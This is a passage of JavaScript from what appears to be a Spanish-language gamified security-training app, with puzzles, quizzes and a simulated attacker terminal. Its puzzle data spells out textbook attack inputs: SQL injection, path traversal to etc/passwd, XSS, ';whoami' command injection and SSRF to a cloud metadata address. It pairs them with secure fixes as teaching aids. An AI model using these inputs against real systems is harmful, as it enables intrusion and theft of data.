+    opts.forEach(function(o){ var b=document.createElement('button'); b.className='g-act'; b.innerHTML='<span>'+o[1]+' — <span style="opacity:.8;font-size:.85em">'+o[2]+'</span></span>'; b.addEventListener('click',function(){ setProfile(o[0]); titleScreen(); }); box.appendChild(b); });
+  }
+
+  function theoryScreen(next){
+    clearTimers();
+    var th=THEORY[gS.key]||{};
+    gcard.innerHTML=wrap(
+      '<div class="g-top"><span>📖 Teoría</span><span>'+esc(shortT(gS.g.t))+'</span></div>'+
+      '<div class="g-char-row" style="margin:.2rem 0">'+avatar(5)+'<div class="g-bubble" style="margin:0"><b class="name">HackerXd</b>: te lo cuento rápido 👇</div></div>'+
+      '<div class="g-screen">'+
+        '<div class="g-explain"><b>¿Qué es?</b><br>'+esc(th.que||'')+'</div>'+
+        '<div class="g-explain"><b>Cómo se detecta</b><br>'+esc(th.detectar||'')+'</div>'+
+        '<div class="g-explain" style="border-left-color:#5ef0c0"><b>Clave / payload</b><br><span style="font-family:var(--mono)">'+esc(th.clave||'')+'</span></div>'+
+        '<div class="g-explain" style="border-left-color:#ffcf3f"><b>Cómo se arregla</b><br>'+esc(th.fix||'')+'</div>'+
+      '</div>'+
+      '<div class="g-row"><button class="g-ghost" id="thBack">Volver</button><button class="g-next" id="thNext">Seguir →</button></div>');
+    document.getElementById('thBack').addEventListener('click',titleScreen);
+    document.getElementById('thNext').addEventListener('click',function(){ (next||renderDiff)(); });
+  }
+
+  // El flujo se adapta al perfil del usuario
+  function startFlow(){
+    var pr=getProfile()||'ambos';
+    if(pr==='teoria') theoryScreen(renderDiff);
+    else if(pr==='juego') puzzleScene();
+    else theoryScreen(puzzleScene);
+  }
+
+  // ---------- Ciclo del juego ----------
+  function openGame(key){ var g=GAMES[key]; if(!g) return; gS={key:key,g:g,diff:null,i:0,t0:0,timer:null,elapsed:0,timers:[],pz:null}; gov.hidden=false; if(!getProfile()) profileScreen(); else titleScreen(); }
+  function clearTimers(){ if(gS){ (gS.timers||[]).forEach(clearTimeout); gS.timers=[]; } }
+  function closeGame(){ if(gS){ if(gS.timer) clearInterval(gS.timer); clearTimers(); } if(gTypeTimer){clearInterval(gTypeTimer);gTypeTimer=null;} gS=null; gov.hidden=true; }
+  gov.addEventListener('click',function(e){ if(e.target===gov) closeGame(); });
+
+  function titleScreen(){
+    var unl=UNLOCKED.length, tot=DEFAULT_UNLOCKED.length+REWARDS.length;
+    gcard.innerHTML=wrap(
+      '<div class="g-coin">INSERT COIN</div>'+
+      '<div class="g-neon"><span class="a">GAME</span><span class="b">HackerXd</span></div>'+
+      '<div class="g-tag">reto: '+esc(gS.g.t)+'</div>'+
+      '<div class="g-char-row">'+avatar(7)+'<span class="g-name">👾 HackerXd</span></div>'+
+      '<button class="g-start" id="gStart">▶ JUGAR</button>'+
+      '<button class="g-mini" id="gTheory">📖 Teoría del tema</button>'+
+      '<button class="g-mini" id="gWard">🎒 Personalizar ('+unl+'/'+tot+' desbloqueado)</button>'+
+      '<button class="g-mini" id="gPrem">💎 Premium'+(isPremium()?' ✅ activo':'')+'</button>'+
+      '<div class="wr-count">Tu perfil: '+profileLabel()+' · <span id="gChgProf" style="text-decoration:underline;cursor:pointer">cambiar</span></div>'+
+      '<button class="g-link" id="gToCode">saltar directo al reto de código →</button>');
+    document.getElementById('gStart').addEventListener('click',startFlow);
+    document.getElementById('gTheory').addEventListener('click',function(){ theoryScreen(titleScreen); });
+    document.getElementById('gWard').addEventListener('click',wardrobe);
+    document.getElementById('gPrem').addEventListener('click',premiumScreen);
+    document.getElementById('gChgProf').addEventListener('click',profileScreen);
+    document.getElementById('gToCode').addEventListener('click',renderDiff);
+  }
+
+  // ---------- Armario / personalización ----------
+  function wardrobe(){
+    clearTimers();
+    var html='<div class="g-char-row">'+avatar(8)+'</div>'+
+      '<div class="wr-count">Equipa lo desbloqueado. Completa un tema en 🔴 difícil y ganas 1 ítem. Los 💎 son Premium.</div>'+
+      '<div class="g-screen">';
+    var cats=[['cap','Gorra'],['glasses','Ojos/Gafas'],['acc','Extra'],['bg','Portal/Fondo'],['anim','Animación']];
+    cats.forEach(function(cp){
+      var cat=cp[0];
+      html+='<div class="wr-cat"><h4>'+cp[1]+'</h4><div class="wr-items">';
+      CATALOG[cat].forEach(function(it){
+        var val=it[0], id=cat+':'+val, on=(EQUIP[cat]===val), prem=!!PREMIUM_ITEMS[id];
+        var owned=prem?isPremium():isUnlocked(cat,val);
+        html+='<button class="wr-it'+(on?' on':'')+(prem?' prem':'')+(owned?'':' lock')+'" data-cat="'+cat+'" data-val="'+val+'"'+(prem?' data-prem="1"':'')+(owned?'':' data-locked="1"')+'>'+(owned?'':(prem?'💎 ':'🔒 '))+esc(it[1])+'</button>';
+      });
+      html+='</div></div>';
+    });
+    html+='</div><div class="g-row"><button class="g-next" id="gBack">Volver</button></div>';
+    gcard.innerHTML=wrap(html);
+    document.getElementById('gBack').addEventListener('click',titleScreen);
+    Array.prototype.forEach.call(gcard.querySelectorAll('.wr-it'),function(b){
+      b.addEventListener('click',function(){
+        if(b.dataset.locked){ if(b.dataset.prem) premiumScreen(); return; }
+        EQUIP[b.dataset.cat]=b.dataset.val; saveCos(); wardrobe();
+      });
+    });
+  }
+
+  // ---------- Premium (código de desbloqueo / Google Play) ----------
+  function premiumScreen(){
+    clearTimers();
+    var on=isPremium();
+    var perks=[['🎞️','Animaciones exclusivas','Glitch, arcoíris y nuevas skins del personaje'],
+      ['🧩','Retos y pruebas nuevas','Ejercicios y puzzles avanzados por tema'],
+      ['🗂️','Temas nuevos','Más vulnerabilidades y módulos conforme se publiquen'],
+      ['🎓','Especialidades','Rutas de forense, red team, cloud y web avanzada']];
+    var list=perks.map(function(p){ return '<div class="g-act" style="cursor:default"><span>'+p[0]+' <b>'+p[1]+'</b><br><span style="opacity:.8;font-size:.82em">'+p[2]+'</span></span></div>'; }).join('');
+    gcard.innerHTML=wrap(
+      '<div class="g-neon"><span class="b" style="font-size:1.6rem">💎 PREMIUM</span></div>'+
+      '<div class="g-char-row">'+avatar(6)+'<span class="g-name">'+(on?'✅ Premium activo':'🔒 Bloqueado')+'</span></div>'+
+      '<div class="g-screen">'+list+'</div>'+
+      (on?'<div class="g-reward">¡Gracias! Tu acceso Premium está activo 🎉</div>'
+        :'<div class="g-say" style="font-size:.82rem">Pago seguro con <b>Google Play</b>. También puedes restaurar una compra anterior o usar un código de desbloqueo.</div>'+
+         '<div class="g-row"><button class="g-next" id="pmBuy">💳 Comprar Premium</button></div>'+
+         '<div class="g-row"><button class="g-ghost" id="pmRestore">♻️ Restaurar compra</button><button class="g-ghost" id="pmCode">Tengo un código</button></div>')+
+      '<div class="g-row"><button class="g-ghost" id="pmBack">Volver</button></div>');
+    document.getElementById('pmBack').addEventListener('click',titleScreen);
+    var bb=document.getElementById('pmBuy'); if(bb) bb.addEventListener('click',function(){ if(window.buyPremium) window.buyPremium(); });
+    var rb=document.getElementById('pmRestore'); if(rb) rb.addEventListener('click',function(){ if(window.restorePremium) window.restorePremium(); });
+    var cb=document.getElementById('pmCode');
+    if(cb) cb.addEventListener('click',function(){ var uov=document.getElementById('unlockOverlay'); if(uov){ uov.hidden=false; var u=document.getElementById('unlockCode'); if(u) u.focus(); } });
+  }
+
+  // ---------- Generador de mini-juegos (procedural, infinito, sin repetir) ----------
+  var WORDS=['admin','root','flag','token','secret','pentest','hacker','bypass','payload','cookie','shell','exploit','kali','burp','nmap','proxy','inject','cipher','brute','vector','packet','socket','kernel','daemon','router','server','access','master'];
+  function rnd(n){ return Math.floor(Math.random()*n); }
+  function shuffle(a){ a=a.slice(); for(var i=a.length-1;i>0;i--){ var j=rnd(i+1),t=a[i]; a[i]=a[j]; a[j]=t; } return a; }
+  function pickWord(ex){ ex=ex||[]; var w; do{ w=WORDS[rnd(WORDS.length)]; }while(ex.indexOf(w)>=0); return w; }
+  function b64(s){ try{ return btoa(s); }catch(e){ return s; } }
+  function rot(s,n){ return s.replace(/[a-z]/g,function(c){ return String.fromCharCode((c.charCodeAt(0)-97+n)%26+97); }); }
+  function codeBox(x){ return '<div style="font:600 1.05rem var(--mono);word-break:break-all;color:#9ff0c2;background:#0b1020;border-radius:6px;padding:.45rem .55rem">'+esc(x)+'</div>'; }
+
+  function genB64(){ var w=pickWord(), enc=b64(w), opts=shuffle([w,pickWord([w]),pickWord([w])]);
+    return {kind:'choice',tag:'🧩 descifrar',sig:'b64:'+enc,scene:codeBox(enc),q:'Esto está en Base64. ¿Qué palabra es?',
+      acts:opts.map(function(o){return {t:o,ok:o===w,m:'No. Base64 es codificación: se revierte con atob() o `base64 -d`.'};}),
+      e:'Base64 NO es cifrado, es codificación: se decodifica con atob() o `base64 -d`. Lo ves en cookies, JWT y payloads.'}; }
+  function genCaesar(){ var w=pickWord(), s=1+rnd(25), enc=rot(w,s), opts=shuffle([w,pickWord([w]),pickWord([w])]);
+    return {kind:'choice',tag:'🔐 descifrar',sig:'cae:'+enc+s,scene:codeBox(enc),q:'Cifrado César (desplazamiento '+s+'). ¿Qué palabra es?',
+      acts:opts.map(function(o){return {t:o,ok:o===w,m:'No. Desplaza cada letra '+s+' posiciones hacia atrás.'};}),
+      e:'El cifrado César desplaza cada letra N posiciones (ROT13 = N 13). Se rompe probando los 25 desplazamientos.'}; }
+  function genHex(){ var L='ABCDEFGHJKLMNPRSTabcdefghjkmnprst', ch=L[rnd(L.length)], cd=ch.charCodeAt(0), hx=cd.toString(16).toUpperCase(), opts=shuffle([ch,L[rnd(L.length)],L[rnd(L.length)]]);
+    return {kind:'choice',tag:'🔢 descifrar',sig:'hex:'+hx,scene:codeBox('0x'+hx+'   ('+cd+' en decimal)'),q:'¿Qué carácter ASCII es este código?',
+      acts:opts.map(function(o){return {t:"'"+o+"'",ok:o===ch,m:'No. 0x41=A, 0x61=a. Pasa hex→decimal→carácter.'};}),
+      e:'Cada carácter tiene un código ASCII (0x41=A, 0x61=a). En hacking ves datos en hex por todas partes.'}; }
+  function genOrder(){ var P=[{n:'SQLi UNION',p:["'","UNION","SELECT","NULL,NULL","--"]},
+      {n:'SQLi login bypass',p:["administrator","'","--"]},
+      {n:'Path traversal',p:["../","../","../","etc/passwd"]},
+      {n:'XSS',p:["<img","src=x","onerror=","alert(1)>"]},
+      {n:'Command injection',p:[";","whoami"]},
+      {n:'SSRF a metadatos',p:["http://","169.254.169.254","/latest/meta-data/"]}];
+    var it=P[rnd(P.length)];
+    return {kind:'order',tag:'🧱 Tetris de código',sig:'ord:'+it.n,pieces:it.p,name:it.n,q:'monta el payload de '+it.n+' tocando las piezas EN ORDEN.',
+      e:'Montar el payload pieza a pieza te enseña su estructura: cada token tiene su función.'}; }
+  function genIng(){ var i=pickNoRepeat('ing',PUZZLES.length), p=PUZZLES[i]; p.kind='choice'; p.tag='🧠 ingenio'; p.sig='ing:'+i; return p; }
+
+  var TOOLS=[['nmap','escanear puertos y servicios'],['sqlmap','automatizar inyección SQL'],['Burp Suite','proxy para interceptar y modificar peticiones web'],['hydra','fuerza bruta de contraseñas'],['John the Ripper','crackear hashes de contraseñas'],['Wireshark','capturar tráfico de red (sniffing)'],['gobuster','descubrir directorios y ficheros ocultos'],['nikto','escanear vulnerabilidades web'],['Metasploit','lanzar exploits conocidos']];
+  function genMatch(){ var i=rnd(TOOLS.length), good=TOOLS[i], others=shuffle(TOOLS.filter(function(_,j){return j!==i;})).slice(0,2), opts=shuffle([good].concat(others));
+    return {kind:'choice',tag:'🧰 ¿para qué sirve?',sig:'tool:'+good[0],scene:'<div style="font:700 1.2rem var(--display);color:#ffd0f0">🧰 '+esc(good[0])+'</div>',q:'¿Para qué se usa '+good[0]+'?',
+      acts:opts.map(function(o){return {t:o[1],ok:o[0]===good[0],m:'No. '+good[0]+' sirve para '+good[1]+'.'};}),
+      e:good[0]+' → '+good[1]+'. Conocer cada herramienta y su propósito es clave en un pentest.'}; }
+
+  var BUGS=[
+    {bad:"query('SELECT * FROM u WHERE id='+id)",good:["query('SELECT * FROM u WHERE id=?',[id])","db.find({id: id})"],why:'Concatenar la entrada en el SQL permite inyección. Lo seguro: consultas parametrizadas (?).'},
+    {bad:"el.innerHTML = userInput",good:["el.textContent = userInput","el.innerText = userInput"],why:'innerHTML con datos del usuario permite XSS. Para texto usa textContent.'},
+    {bad:"exec('ping '+host)",good:["execFile('ping',[host])","spawn('ping',[host])"],why:'Meter la entrada en una shell permite command injection. Pasa los argumentos por separado.'},
+    {bad:"open('/files/'+name)",good:["open(safeJoin('/files',name))","open('/files/'+basename(name))"],why:'Concatenar el nombre permite path traversal (../). Normaliza o usa solo el nombre base.'}
+  ];
+  function genFindBug(){ var it=BUGS[rnd(BUGS.length)], opts=shuffle([{c:it.bad,ok:true},{c:it.good[0],ok:false},{c:it.good[1],ok:false}]);
+    return {kind:'choice',tag:'🐞 encuentra el fallo',sig:'bug:'+it.bad,scene:'<div style="font-size:.9rem;color:#e0b0ff">¿Cuál línea es VULNERABLE?</div>',q:'¿Cuál de estas líneas tiene el fallo de seguridad?',
+      acts:opts.map(function(o){return {t:o.c,ok:o.ok,m:'No, esa es segura. Busca la que mezcla datos del usuario sin proteger.'};}),
+      e:it.why}; }
+
+  function genBin(){ var n=1+rnd(14), bin=n.toString(2); while(bin.length<4) bin='0'+bin;
+    var set={}; set[n]=1; while(Object.keys(set).length<3){ var d=Math.max(0,Math.min(15,n+(rnd(7)-3))); set[d]=1; }
+    var opts=shuffle(Object.keys(set).map(Number));
+    return {kind:'choice',tag:'🎳 bolos binarios',sig:'bin:'+bin,scene:'<div style="font:700 1.6rem var(--mono);letter-spacing:.35em;color:#9ff0c2">🎳 '+bin+'</div>',q:'Derriba el pin: ¿qué número decimal es '+bin+' en binario?',
+      acts:opts.map(function(o){return {t:String(o),ok:o===n,m:'No. Los bits valen 8·4·2·1. '+bin+' = '+n+'.'};}),
+      e:'Binario→decimal: cada bit vale 8·4·2·1 (en 4 bits). '+bin+' = '+n+'.'}; }
+
+  var GENERATORS=[genB64,genCaesar,genHex,genOrder,genIng,genMatch,genFindBug,genBin];
+  // Genera un reto nuevo; si por casualidad coincide con uno reciente, lo cambia por otro.
+  function nextPuzzle(){ var gi=pickNoRepeat('gen',GENERATORS.length), p, tries=0;
+    do{ p=GENERATORS[gi](); tries++; }while(seenRecent('pzsig',p.sig) && tries<8);
+    rememberRecent('pzsig',p.sig,60); return p; }
+
+  function puzzleOrder(pz){
+    var items=shuffle(pz.pieces.map(function(t,i){return {t:t,i:i};}));
+    gcard.innerHTML=wrap(
+      '<div class="g-char-row">'+avatar(6)+'<span class="g-name">👾 HackerXd</span></div>'+
+      '<div class="g-say"><b class="name">HackerXd</b>: '+(pz.tag||'🧱')+' — '+esc(pz.q)+'</div>'+
+      '<div class="g-screen"><div class="ord-target" id="ordT"><span style="color:#9a7fc0">toca las piezas en orden…</span></div><div class="ord-pieces" id="ordP"></div></div>'+
+      '<div class="g-fb" id="pFb" style="text-align:center"></div>'+
+      '<div class="g-skipbar"><button class="g-skip" id="gSkipP">saltar puzzle ⏭</button></div>');
+    document.getElementById('gSkipP').addEventListener('click',function(){ bump('game-skips'); renderDiff(); });
+    var idx=0, built=[], tgt=document.getElementById('ordT'), pool=document.getElementById('ordP');
+    items.forEach(function(it){
+      var b=document.createElement('button'); b.className='ord-pz'; b.textContent=it.t;
+      b.addEventListener('click',function(){
+        if(b.disabled) return; var fb=document.getElementById('pFb');
+        if(it.i!==idx){ b.classList.add('bad'); setTimeout(function(){b.classList.remove('bad');},350); fb.textContent='❌ esa pieza no va ahí todavía'; return; }
+        b.disabled=true; b.classList.add('ok'); built.push(it.t); idx++;
+        tgt.innerHTML='<span>'+esc(built.join(' '))+'</span>'; fb.textContent='';
+        if(idx>=pz.pieces.length){
+          var say=gcard.querySelector('.g-say'); if(say) say.innerHTML='<b class="name">HackerXd</b>: 🧱 ¡payload montado! '+esc(pz.e);
+          var bar=document.querySelector('.g-skipbar'); if(bar){ bar.innerHTML='<button class="g-next" id="gGo">Seguir → elegir el código</button>'; document.getElementById('gGo').addEventListener('click',renderDiff); }
+        }
+      });
+      pool.appendChild(b);
+    });
+  }
+
+  // ---------- Puzzle (procedural, sin repetir) ----------
+  function puzzleScene(){
+    clearTimers();
+    gS.pz=nextPuzzle();
+    var pz=gS.pz;
+    if(pz.kind==='order') return puzzleOrder(pz);
+    var vis = pz.jar ? '<div class="jar" id="jar"><div class="water"></div><div class="ball"></div></div>'
+                     : '<div class="g-pscene">'+pz.scene+'</div>';
+    gcard.innerHTML=wrap(
+      '<div class="g-char-row">'+avatar(6)+'<span class="g-name">👾 HackerXd</span></div>'+
+      '<div class="g-say"><b class="name">HackerXd</b>: '+(pz.tag||'reto 🧠')+' — '+esc(pz.q)+'</div>'+
+      '<div class="g-screen">'+vis+'<div class="g-acts" id="gActs"></div></div>'+
+      '<div class="g-fb" id="pFb" style="text-align:center"></div>'+
+      '<div class="g-skipbar"><button class="g-skip" id="gSkipP">saltar puzzle ⏭</button></div>');
+    document.getElementById('gSkipP').addEventListener('click',function(){ bump('game-skips'); renderDiff(); });
+    var box=document.getElementById('gActs');
+    pz.acts.forEach(function(a){
+      var b=document.createElement('button'); b.className='g-act'; b.textContent=a.t;
+      b.addEventListener('click',function(){ puzzlePick(a,b,box); });
+      box.appendChild(b);
+    });
+  }
+  function puzzlePick(a,btn,box){
+    var fb=document.getElementById('pFb');
+    if(!a.ok){ btn.classList.add('bad'); fb.textContent='❌ '+a.m; return; }
+    Array.prototype.forEach.call(box.querySelectorAll('.g-act'),function(o){ o.setAttribute('disabled','disabled'); });
+    btn.classList.add('ok'); fb.textContent='';
+    var jar=document.getElementById('jar'); if(jar) jar.classList.add('solved');
+    var sc=gcard.querySelector('.g-pscene'); if(sc){ sc.innerHTML='<span class="pop">🎉</span> '+sc.innerHTML; }
+    var say=gcard.querySelector('.g-say');
+    (gS.timers=gS.timers||[]).push(setTimeout(function(){
+      if(say) say.innerHTML='<b class="name">HackerXd</b>: ¡eso es! ✅ '+esc(gS.pz.e)+' <b>Así piensa un hacker.</b>';
+      var bar=document.querySelector('.g-skipbar');
+      if(bar){ bar.innerHTML='<button class="g-next" id="gGo">Seguir → elegir el código</button>'; document.getElementById('gGo').addEventListener('click',renderDiff); }
+    }, jar?1700:450));
+  }
+
+  function renderDiff(){
+    clearTimers();
+    var html='<div class="g-char-row">'+avatar(6)+'<span class="g-name">👾 HackerXd</span></div>'+
+      '<div class="g-say"><b class="name">HackerXd</b>: ahora el código. Elige nivel — en 🔴 <b>difícil</b> ganas recompensas para tu personaje 🎁</div>'+
+      '<div class="g-screen"><div class="g-acts" id="gDiff"></div></div>'+
+      '<div class="g-skipbar"><button class="g-skip" id="gCl">cerrar</button></div>';
+    gcard.innerHTML=wrap(html);
+    document.getElementById('gCl').addEventListener('click',closeGame);
+    var box=document.getElementById('gDiff');
+    [['facil','🟢 Fácil','Te ilumino la respuesta correcta.'],
+     ['media','🟡 Media','Te doy una pista.'],
+     ['dificil','🔴 Difícil','Sin ayudas. Cronómetro, récord y recompensas 🎁']].forEach(function(d){
+      var b=document.createElement('button'); b.className='g-act'; b.innerHTML='<span>'+d[1]+' — <span style="opacity:.8;font-size:.85em">'+d[2]+'</span></span>';
+      b.addEventListener('click',function(){ gS.diff=d[0]; startPlay(); }); box.appendChild(b);
+    });
+  }
+
+  function startPlay(){
+    gS.i=0; gS.t0=Date.now(); gS.elapsed=0;
+    if(gS.timer) clearInterval(gS.timer);
+    if(gS.diff==='dificil'){ gS.timer=setInterval(function(){ gS.elapsed=Math.floor((Date.now()-gS.t0)/1000); var el=document.getElementById('gTimer'); if(el) el.textContent=gfmt(gS.elapsed); },1000); }
+    renderStep();
+  }
+
+  // ---------- Modo consola (difícil): escribir el comando ----------
+  function cmdFor(key,j){ var hk=HACKS[key]; if(!hk||!hk.steps||!hk.steps[j]) return null; var c=hk.steps[j].c; if(!c||c.charAt(0)==='[') return null; return c; }
+  function hardAvailable(g){ var N=g.pasos.length, last=(gS.i+1>=N),j; if(last){ for(j=0;j<N;j++){ if(cmdFor(gS.key,j)) return true; } return false; } return !!cmdFor(gS.key,gS.i); }
+  function normCmd(s){ return (s||'').toLowerCase().replace(/\s+/g,'').trim(); }
+  function renderHard(){
+    var g=gS.g, N=g.pasos.length, last=(gS.i+1>=N), cmds=[], j;
+    if(last){ for(j=0;j<N;j++){ var c=cmdFor(gS.key,j); if(c) cmds.push({expected:c,goal:'Comando '+(j+1)+'/'+N+': '+g.pasos[j].q,step:HACKS[gS.key].steps[j],e:g.pasos[j].e}); } }
+    else { var cc=cmdFor(gS.key,gS.i); cmds=[{expected:cc,goal:g.pasos[gS.i].q,step:HACKS[gS.key].steps[gS.i],e:g.pasos[gS.i].e}]; }
+    hardConsole(cmds, last?'Terminar 🏁':'Siguiente reto →', function(){ gS.i=last?N:gS.i+1; if(gS.i>=N) finishGame(); else renderStep(); });
+  }
+  function hardConsole(cmds, finalLabel, onFinish){
+    var g=gS.g, ci=0, done=[];
+    function draw(){
+      var cur=cmds[ci], termHtml=esc(done.join('\n'));
+      gcard.innerHTML=wrap(
+        '<div class="g-top"><span>'+esc(g.t)+' · 🔴 difícil'+(cmds.length>1?' · EXAMEN FINAL':'')+'</span><span>⏱ <span id="gTimer">'+gfmt(gS.elapsed)+'</span></span></div>'+
+        '<div class="g-char-row" style="margin:.2rem 0">'+avatar(5)+'<div class="g-bubble" style="margin:0"><b class="name">HackerXd</b>: escribe el comando — '+esc(cur.goal)+'</div></div>'+
+        '<div class="hk-tags"><span>🧑‍💻 terminal del atacante ('+(ci+1)+'/'+cmds.length+')</span><span>escribe y Ejecuta ▶</span></div>'+
+        '<div class="hk-win"><div class="hk-bar"><span class="hk-dot"></span>HackerXd@kali</div><div class="hk-term" id="hkT">'+termHtml+(termHtml?'\n':'')+'$ <span class="cc"></span></div></div>'+
+        '<div class="hk-win hk-brow"><div class="hk-url">🔒 '+esc((HACKS[gS.key]&&HACKS[gS.key].url)||'objetivo')+'</div><div class="hk-page" id="hkP"><span class="muted">esperando comando…</span></div></div>'+
+        '<input id="hkIn" class="hk-input" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" placeholder="escribe el comando…">'+
+        '<div class="g-row"><button class="g-ghost" id="hkHint">💡 Pista</button><button class="g-next" id="hkRun">Ejecutar ▶</button></div>'+
+        '<div class="g-fb" id="gFb"></div><div id="gAfter"></div>');
+      var inp=document.getElementById('hkIn'); if(inp){ try{inp.focus();}catch(e){} inp.addEventListener('keydown',function(e){ if(e.key==='Enter'){ e.preventDefault(); run(); } }); }
+      document.getElementById('hkRun').addEventListener('click',run);
+      document.getElementById('hkHint').addEventListener('click',function(){ var x=document.getElementById('hkIn'); if(x){ x.value=cmds[ci].expected; try{x.focus();}catch(e){} } });
+    }
+    function run(){
+      var inp=document.getElementById('hkIn'); if(!inp) return; var cur=cmds[ci];
+      if(normCmd(inp.value)!==normCmd(cur.expected)){ var fb=document.getElementById('gFb'); if(fb) fb.textContent='❌ no es exacto. Usa 💡 Pista si lo necesitas.'; inp.classList.add('bad'); setTimeout(function(){inp.classList.remove('bad');},350); return; }
+      done.push('$ '+cur.expected+(cur.step&&cur.step.o?'\n'+cur.step.o:''));
+      var page=document.getElementById('hkP'); if(page&&cur.step&&cur.step.s) page.innerHTML=cur.step.s;
+      ci++;
+      if(ci>=cmds.length){
+        var term=document.getElementById('hkT'); if(term) term.innerHTML=esc(done.join('\n'));
+        var inp2=document.getElementById('hkIn'); if(inp2) inp2.disabled=true;
+        var fb=document.getElementById('gFb'); if(fb) fb.textContent='';
+        var after=document.getElementById('gAfter'); if(after){ after.innerHTML='<div class="g-explain"><b class="name">HackerXd</b>: 💥 ejecutado. '+esc(cmds[cmds.length-1].e||'')+'</div><div class="g-row"><button class="g-next" id="hkNext">'+esc(finalLabel)+'</button></div>'; var nx=document.getElementById('hkNext'); if(nx) nx.addEventListener('click',onFinish); after.scrollIntoView&&after.scrollIntoView({block:'nearest'}); }
+      } else { draw(); }
+    }
+    draw();
+  }
+
+  function renderStep(){
+    if(gTypeTimer){clearInterval(gTypeTimer);gTypeTimer=null;}
+    var g=gS.g, paso=g.pasos[gS.i], diff=gS.diff;
+    if(diff==='dificil' && hardAvailable(g)) return renderHard();
+    gcard.innerHTML=wrap(
+      '<div class="g-top"><span>'+esc(g.t)+'</span><span>Reto '+(gS.i+1)+'/'+g.pasos.length+
+        (diff==='dificil'?' · ⏱ <span id="gTimer">'+gfmt(gS.elapsed)+'</span>':(diff==='facil'?' · 🟢':' · 🟡'))+'</span></div>'+
+      '<div class="g-char-row" style="margin:.2rem 0">'+avatar(5)+
+        '<div class="g-bubble" style="margin:0"><b class="name">HackerXd</b>: '+esc(paso.q)+'</div></div>'+
+      (diff==='media'?'<div class="g-explain">💡 Pista: fíjate en cerrar bien la sintaxis — comillas, comentarios o el separador correcto.</div>':'')+
+      '<div class="g-opts" id="gOpts"></div><div class="g-fb" id="gFb"></div><div id="gAfter"></div>');
+    var opts=document.getElementById('gOpts'), letters=['A','B','C'];
+    paso.o.forEach(function(op,idx){
+      var b=document.createElement('button'); b.className='g-opt'+(diff==='facil'&&idx===paso.c?' glow':'');
+      b.innerHTML='<span class="k">'+letters[idx]+'</span><span class="code">'+esc(op)+'</span>';
+      b.addEventListener('click',function(){ choose(idx,b,opts); });
+      opts.appendChild(b);
+    });
+  }
+
+  function choose(idx,btn,opts){
+    var paso=gS.g.pasos[gS.i];
+    if(idx!==paso.c){ btn.classList.add('bad'); var fb=document.getElementById('gFb'); if(fb) fb.textContent='HackerXd: esa no — mira la sintaxis e inténtalo otra vez.'; return; }
+    Array.prototype.forEach.call(opts.querySelectorAll('.g-opt'),function(o){ o.setAttribute('disabled','disabled'); o.classList.remove('glow'); });
+    btn.classList.add('ok');
+    var fb=document.getElementById('gFb'); if(fb) fb.textContent='';
+    var after=document.getElementById('gAfter');
+    var last=(gS.i+1>=gS.g.pasos.length);
+    after.innerHTML=
+      '<div class="g-explain"><b class="name">HackerXd</b>: '+esc(paso.e)+'</div>'+
+      '<div style="font-size:.78rem;color:#d9b3ff;margin:.5rem 0 .15rem">🎬 Así entra y lo ejecuta de verdad:</div>'+
+      '<div id="gExp"></div>'+
+      '<div class="g-row" id="gNxRow" style="display:none"><button class="g-next" id="gNx">'+(last?'Terminar 🏁':'Siguiente reto →')+'</button></div>';
+    var goNext=function(){ gS.i++; if(gS.i>=gS.g.pasos.length) finishGame(); else renderStep(); };
+    var revealNext=function(){ var r=document.getElementById('gNxRow'); if(r){ r.style.display=''; var nx=document.getElementById('gNx'); if(nx) nx.addEventListener('click',goNext); } var a=document.getElementById('gAfter'); a&&a.scrollIntoView&&a.scrollIntoView({block:'nearest'}); };
+    var hk=HACKS[gS.key];
+    if(hk&&hk.steps&&hk.steps[gS.i]){ playExploit(hk,gS.i,document.getElementById('gExp'),revealNext); }
+    else { document.getElementById('gExp').innerHTML='<div style="font-size:.78rem;color:#d9b3ff;margin:0 0 .15rem">HackerXd lo escribe:</div><div class="g-type"><span id="gTypeTxt"></span><span class="g-caret">▋</span></div>'; typeOut(paso.o[paso.c]); revealNext(); }
+    after.scrollIntoView&&after.scrollIntoView({block:'nearest'});
+  }
+
+  function typeOut(txt){
+    if(gTypeTimer){clearInterval(gTypeTimer);gTypeTimer=null;}
+    var span=document.getElementById('gTypeTxt'); if(!span) return;
+    var reduce=false; try{ reduce=window.matchMedia&&window.matchMedia('(prefers-reduced-motion:reduce)').matches; }catch(e){}
+    if(reduce){ span.textContent=txt; return; }
+    var i=0; gTypeTimer=setInterval(function(){ i++; span.textContent=txt.slice(0,i); if(i>=txt.length){ clearInterval(gTypeTimer); gTypeTimer=null; } },55);
+  }
+
+  function shortT(t){ return t.split(' — ')[0].split(':')[0]; }
+
+  // Reproduce una escena de ataque: terminal de Juan + pantalla de la víctima
+  function playExploit(hk,idx,el,done){
+    var st=hk.steps[idx], cmd='$ '+st.c, fin=false;
+    el.innerHTML=
+      '<div class="hk-tags"><span>🧑‍💻 Juan (atacante)</span><span>🖥️ '+esc(hk.victim)+' (víctima)</span></div>'+
+      '<div class="hk-win"><div class="hk-bar"><span class="hk-dot"></span>HackerXd@kali</div><div class="hk-term" id="hkT">$ <span class="cc"></span></div></div>'+
+      '<div class="hk-win hk-brow"><div class="hk-url">🔒 '+esc(hk.url)+'</div><div class="hk-page" id="hkP"><span class="muted">esperando petición…</span></div></div>'+
+      '<div class="g-skipbar"><button class="g-skip" id="hkSkip">saltar ⏭</button></div>';
+    var term=document.getElementById('hkT'), page=document.getElementById('hkP');
+    function push(fn,ms){ (gS.timers=gS.timers||[]).push(setTimeout(function(){ if(!fin) fn(); },ms)); }
+    function finishScene(){ term.innerHTML='<span class="pr">'+esc(cmd)+'</span>'+(st.o?'\n<span class="ot">'+esc(st.o)+'</span>':''); page.innerHTML=st.s+(st.a?'<div class="hk-alert"><div class="h">'+esc(hk.url.split("/")[0])+' dice:</div><div class="b">'+esc(st.a)+'<br><span class="ab">Aceptar</span></div></div>':''); }
+    function end(){ if(fin)return; fin=true; done(); }
+    document.getElementById('hkSkip').addEventListener('click',function(){ clearTimers(); finishScene(); end(); });
+    var i=0;
+    function type(){ i++; term.innerHTML='<span class="pr">'+esc(cmd.slice(0,i))+'</span><span class="cc"></span>';
+      if(i<cmd.length){ push(type,30); }
+      else { push(function(){ term.innerHTML='<span class="pr">'+esc(cmd)+'</span>'+(st.o?'\n<span class="ot">'+esc(st.o)+'</span>':'');
+        push(function(){ page.innerHTML=st.s;
